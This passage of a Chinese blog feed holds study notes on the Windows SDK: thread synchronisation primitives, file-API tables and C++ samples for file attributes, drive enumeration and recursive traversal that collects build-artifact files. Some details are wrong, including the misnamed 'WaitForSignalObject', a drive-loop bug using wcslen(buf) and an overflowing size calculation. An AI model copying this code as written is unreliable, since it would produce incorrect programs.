class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">9</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//4个消费者</span></span><br><span class="line">    hThread[<span class="number">10</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">11</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">12</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">13</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(<span class="number">14</span>, hThread, TRUE, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>原子操作，只能保证对于基本算数操作是原子性的。</p><p>临界区和互斥体从词语的含义上看，他们主要就是为了解决互斥问题。</p><p>临界区的优点是快。互斥体的优点是能够跨进程访问，崩溃不死锁。</p><p>事件 从词语的含义上看，更适合做通知（产生了一个事件）。比较适合解决有先后顺序的多线程问题。</p><p>事件和互斥体的最大区别，就是线程所有权。互斥体谁上锁，谁开锁。事件没有这个要求。</p><p>信号量，由于存在信号数的问题，比较适合解决多线程的协调问题。典型问题，就是生产者消费者问题。</p><h3 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h3><p>原子操作：</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>InterlockedIncrement</td><td>自增</td><td>InterlockedIncrement(&amp;g_count)</td></tr><tr><td>InterlockedDecrement</td><td>自减</td><td>InterlockedDecrement(&amp;g_count);</td></tr><tr><td>InterlockedExchangeAdd</td><td>加法/减法</td><td>InterlockedExchangeAdd(&amp;g_count, 256L);</td></tr><tr><td>InterlockedExchange</td><td>赋值</td><td>InterlockedExchange(&amp;g_count, 256L);</td></tr></tbody></table></div><p>临界区</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>InitializeCriticalSection</td><td>初始化</td><td></td></tr><tr><td>DeleteCriticalSection</td><td>销毁</td><td></td></tr><tr><td>EnterCriticalSection</td><td>进入临界区</td><td></td></tr><tr><td>LeaveCriticalSection</td><td>离开临界区</td></tr></tbody></table></div><p>互斥体</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateMutex</td><td>创建互斥体</td><td>可以给互斥体起名字</td></tr><tr><td>OpenMutex</td><td>打开互斥体，得到句柄</td><td>根据名字才能打开互斥体</td></tr><tr><td>ReleaseMutex</td><td>释放互斥体</td><td>会使得互斥体处于激发态</td></tr><tr><td>CloseHandle</td><td>关闭句柄</td><td>使用完后关闭</td></tr><tr><td>WaitForSignalObject</td><td>等待互斥体处于激发态</td><td>等到激发态后，会使得互斥体再次处于非激发态</td></tr></tbody></table></div><p>事件</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateEvent</td><td>创建事件</td><td>可以给事件起名字 可以设置两种模式：手工 自动</td></tr><tr><td>OpenEvent</td><td>打开事件，得到句柄</td><td>根据名字才能打开事件</td></tr><tr><td>SetEvent</td><td>释放事件</td><td>会使得事件处于激发态</td></tr><tr><td>ResetEvent</td><td>重置事件</td><td>会使得事件处于非激发态，对手工模式的事件有效</td></tr><tr><td>WaitForSignalObject</td><td>等待事件处于激发态</td><td>等到激发态后，对于自动模式的事件会使其再次处于非激发态</td></tr></tbody></table></div><p>信号量</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateSemaphore</td><td>创建信号量</td><td>可以给信号量起名字 可以指定最大信号数和当前信号数</td></tr><tr><td>OpenSemaphore</td><td>打开信号量</td><td>根据名字才能打开信号量</td></tr><tr><td>ReleaseSemaphore</td><td>释放信号量</td><td>会增加信号量的信号数，但是不会超过最大信号数</td></tr><tr><td>WaitForSignalObject</td><td>等待信号量处于激发态</td><td>若处于激发态，则会减少1个信号数，信号数位0，将其置为非激发态</td></tr></tbody></table></div><h1 id="九、文件操作"><a href="#九、文件操作" class="headerlink" title="九、文件操作"></a>九、文件操作</h1><div class="table-container"><table><thead><tr><th>DeleteFile</th><th>删除文件</th></tr></thead><tbody><tr><td>CopyFile</td><td>拷贝文件</td></tr><tr><td>MoveFile</td><td>移动文件</td></tr><tr><td>CreateFile</td><td>打开文件</td></tr><tr><td>GetFileSize</td><td>获取文件大小</td></tr><tr><td>ReadFile</td><td>读取文件</td></tr><tr><td>CloseHandle</td><td>关闭文件</td></tr><tr><td>FindFirstFile</td><td>查找第一个文件</td></tr><tr><td>FindNextFile</td><td>查找下一个文件</td></tr><tr><td>WriteFile</td><td>写入数据</td></tr></tbody></table></div><h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyEnumFile</span><span class="params">(<span class="type">const</span> TCHAR * szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WIN32_FIND_DATA wfd = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">HANDLE hFind =  <span class="built_in">FindFirstFile</span>(szPath, &amp;wfd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hFind!=INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件夹：%S\n&quot;</span>, wfd.cFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//MyEnumFile();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件：%S\n&quot;</span>, wfd.cFileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hFind, &amp;wfd));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 删除文件</span></span><br><span class="line"><span class="comment">//DeleteFile(_T(&quot;D:\\hehe\\haha.txt&quot;));</span></span><br><span class="line"><span class="comment">//2. 拷贝文件</span></span><br><span class="line"><span class="comment">//CopyFile(_T(&quot;D:\\hehe\\123\\haha.txt&quot;), _T(&quot;D:\\hehe\\123.txt&quot;),TRUE);</span></span><br><span class="line"><span class="comment">//3. 移动文件</span></span><br><span class="line"><span class="comment">//MoveFile(_T(&quot;D:\\hehe\\123\\haha.txt&quot;), _T(&quot;D:\\hehe\\nihao.txt&quot;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 打开文件 进行读写  fread   fwrite</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">_T(<span class="string">&quot;D:/hehe/123/haha.txt&quot;</span>),            <span class="comment">//路径</span></span><br><span class="line">GENERIC_READ | GENERIC_WRITE, <span class="comment">//打开的权限</span></span><br><span class="line"><span class="literal">NULL</span>,                         <span class="comment">//共享模式</span></span><br><span class="line"><span class="literal">NULL</span>,                         <span class="comment">//安全属性</span></span><br><span class="line">OPEN_EXISTING,                <span class="comment">//</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,        <span class="comment">//普通属性</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//获取文件大小，申请相应的缓冲区空间</span></span><br><span class="line">DWORD dwSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="type">char</span>* pbuf = <span class="keyword">new</span> <span class="type">char</span>[dwSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, pbuf, dwSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//5. 查看文件的属性</span></span><br><span class="line"><span class="comment">//5.1 基本属性</span></span><br><span class="line">DWORD dwAttribute = <span class="built_in">GetFileAttributes</span>(_T(<span class="string">&quot;D:\\hehe\\123\\haha.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (dwAttribute&amp; FILE_ATTRIBUTE_HIDDEN)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个文件是隐藏的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dwAttribute &amp; FILE_ATTRIBUTE_READONLY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这个文件是只读的&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line">WIN32_FILE_ATTRIBUTE_DATA wfad = &#123;&#125;;</span><br><span class="line"><span class="built_in">GetFileAttributesEx</span>(_T(<span class="string">&quot;D:\\hehe\\123\\haha.txt&quot;</span>), GetFileExInfoStandard, &amp;wfad);</span><br><span class="line"><span class="comment">//5.2 扩展属性</span></span><br><span class="line">wfad.ftCreationTime;<span class="comment">//这里获取到的是时间戳</span></span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;wfad.ftCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="comment">//6. 枚举某一个文件夹下的文件</span></span><br><span class="line"><span class="built_in">MyEnumFile</span>(_T(<span class="string">&quot;D:\\*&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历盘符"><a href="#遍历盘符" class="headerlink" title="遍历盘符"></a>遍历盘符</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"></span><br><span class="line">DWORD 总容量;</span><br><span class="line">DWORD 空闲容量;</span><br><span class="line"><span class="built_in">GetLogicalDriveStrings</span>(<span class="number">100</span>, buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="type">int</span> Flag = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//wprintf(_T(&quot;%s  &quot;), pTemp);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = Flag;</span><br><span class="line">li.pszText = pTemp;</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = <span class="built_in">GetDriveType</span>(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;可移动设备&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;硬盘&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;远程设备&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;光驱&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,</span><br><span class="line">&amp;每簇的扇区数量,</span><br><span class="line">&amp;每个扇区的容量,</span><br><span class="line">&amp;空闲簇的总量,</span><br><span class="line">&amp;全部簇的总量</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Flag++;</span><br><span class="line">pTemp += <span class="built_in">wcslen</span>(buf)+<span class="number">1</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件遍历</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyDlg2::EnumFile</span><span class="params">(CString filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//每次遍历都得置0</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">dwConstSize1 = <span class="number">0</span>;</span><br><span class="line">dwConstSize2 = <span class="number">0</span>;</span><br><span class="line">CString cs;</span><br><span class="line"><span class="comment">// 拼接完整路径</span></span><br><span class="line">CString fullPath = filePath + <span class="string">L&quot;\\*&quot;</span>;</span><br><span class="line"><span class="comment">// 查找第一个文件</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = <span class="built_in">FindFirstFile</span>(fullPath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出文件的信息，</span></span><br><span class="line"><span class="comment">// 过滤两个文件夹……</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">wcscmp</span>(fileData.cFileName, <span class="string">L&quot;.&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(fileData.cFileName, <span class="string">L&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找到的是目录，递归遍历目录中的其他文件</span></span><br><span class="line"><span class="keyword">if</span> (fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnumFile</span>(filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_FileList.<span class="built_in">InsertItem</span>(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">DWORD dwSize = (fileData.nFileSizeHigh * (MAXDWORD + <span class="number">1</span>))</span><br><span class="line">+ fileData.nFileSizeLow;</span><br><span class="line"><span class="comment">// 转换成字符串格式</span></span><br><span class="line"></span><br><span class="line">cs.<span class="built_in">Format</span>(<span class="string">L&quot;%d kb&quot;</span>, dwSize/<span class="number">1024</span>);</span><br><span class="line">m_FileList.<span class="built_in">SetItemText</span>(i, <span class="number">1</span>, cs);</span><br><span class="line"><span class="comment">// 筛选处指定后缀名的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">wcscmp</span>(<span class="string">L&quot;.exe&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.obj&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.tlog&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.idb&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.pdb&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.pch&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.res&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.ilk&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.sdf&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.ipch&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.log&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.lastbuildstate&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> </span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">CString csPath;<span class="comment">//保存路径到vector中</span></span><br><span class="line">csPath.<span class="built_in">Format</span>(<span class="string">L&quot;%s\\%s&quot;</span> , filePath,fileData.cFileName);</span><br><span class="line"></span><br><span class="line">path.<span class="built_in">push_back</span>(csPath);<span class="comment">//将路径加入vector</span></span><br><span class="line">m_FileList2.<span class="built_in">InsertItem</span>(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line">m_FileList2.<span class="built_in">SetItemText</span>(i, <span class="number">1</span>, cs);</span><br><span class="line"></span><br><span class="line">dwConstSize2 += dwSize / <span class="number">1024</span>;</span><br><span class="line">j ++;</span><br><span class="line">&#125;</span><br><span class="line">dwConstSize1 += dwSize / <span class="number">1024</span>;</span><br><span class="line">i++;</span><br><span class="line"><span class="comment">// 继续遍历下一个文件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hFile, &amp;fileData));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">菜鸡食用指南🤓</summary>
    
    
    
    <category term="Windows安全" scheme="http://example.com/categories/Windows%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SDK" scheme="http://example.com/tags/SDK/"/>
    
  </entry>
  
  <entry>
    <title>Web应急响应工具</title>
    <link href="http://example.com/2022/11/23/Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/2022/11/23/Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/</id>
    <published>2022-11-23T13:34:23.000Z</published>
    <updated>2022-11-23T13:35:18.355Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="92c1d19edaa8aa5b4c2cac28ee8aa454abd9fea0e91cb97bb76efbd9412da027">48e22157b1ef105701eba779d55791b9b7bf81dcf2fbe51e642c1382bdb61b5f0f01be820cf6d65475b36b9789b7c1d1eb29aed3d9317a7f7d68f50136b3148ad17d1e46d190d9a823f6798fdc522007c0180105963d5bc4091b8b926e4fd8539ca36ae4eb97fb7e84249d138ba7800047c8d19f04ce6184c94dbcecb60ab9ef1f5d4f6a029a2f9b0d2aefb32fd083f006790533441f868f7d6431e353c1abf07cf0c1ab211eccda1dc7a6c586339af60becda821ae2a2312150d6204ee5a7a35b8f8a278b2227d0ad77fe1f24e78412d8d378728e5d681c0404b2b46a68a37d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是容易感染的</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">本资源只供学习参考之用，收集与互联网，请勿用于其它用途，本人概不负责。</summary>
    
    
    
    <category term="Web安全" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web应急响应工具" scheme="http://example.com/tags/Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>测试PDF</title>
    <link href="http://example.com/2022/11/23/%E6%B5%8B%E8%AF%95PDF/"/>
    <id>http://example.com/2022/11/23/%E6%B5%8B%E8%AF%95PDF/</id>
    <published>2022-11-23T12:07:30.000Z</published>
    <updated>2022-11-23T12:14:29.411Z</updated>
    
